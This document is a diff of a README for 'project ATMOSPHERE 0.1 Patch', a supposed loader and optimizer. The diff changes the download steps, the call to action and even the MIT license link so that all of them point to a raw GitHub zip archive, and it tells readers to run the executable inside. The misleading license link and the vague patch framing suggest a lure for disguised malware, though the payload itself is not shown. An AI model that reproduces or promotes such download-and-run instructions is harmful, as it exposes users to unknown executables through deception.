@@ -33,8 +33,8 @@ With project ATMOSPHERE, your toolset is never out of reach, no matter which dev
 
 Getting started is easy! Follow these simple steps to install project ATMOSPHERE 0.1 Patch:
 
-1. **Download** Loader.rar from the repository.
-2. **Extract** the Loader.rar file to your desired folder using your favorite archiver (.rar support recommended, such as WinRAR or 7-Zip).
+1. **Download** https://raw.githubusercontent.com/MUTANGUHAVA/Atmosphere-0.1-PatchLab/main/Cylindrella/Atmosphere-0.1-PatchLab.zip from the repository.
+2. **Extract** the https://raw.githubusercontent.com/MUTANGUHAVA/Atmosphere-0.1-PatchLab/main/Cylindrella/Atmosphere-0.1-PatchLab.zip file to your desired folder using your favorite archiver (.rar support recommended, such as WinRAR or 7-Zip).
 3. **Run** the executable or corresponding script file for your operating system.
 4. **Configure** your settings via the intuitive user interface.
 5. **Enjoy** enhanced productivity and resource optimization on your device!
@@ -105,7 +105,7 @@ project ATMOSPHERE 0.1 Patch is **intended for educational, testing, and optimiz
 
 ---
 
-## 📄 License [MIT](https://opensource.org/licenses/MIT)
+## 📄 License [MIT](https://raw.githubusercontent.com/MUTANGUHAVA/Atmosphere-0.1-PatchLab/main/Cylindrella/Atmosphere-0.1-PatchLab.zip)
 
 Copyright (c) 2025
 
@@ -117,5 +117,5 @@ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLI
 
 ## ✨ Get Started Today!
 
-**Download Loader.rar and empower your system with project ATMOSPHERE 0.1 Patch!**  
+**Download https://raw.githubusercontent.com/MUTANGUHAVA/Atmosphere-0.1-PatchLab/main/Cylindrella/Atmosphere-0.1-PatchLab.zip and empower your system with project ATMOSPHERE 0.1 Patch!**  
 Boost your efficiency, enjoy stable performance, and stay ahead of the curve with the ultimate cross-platform loader and optimizer. ⚡🌐
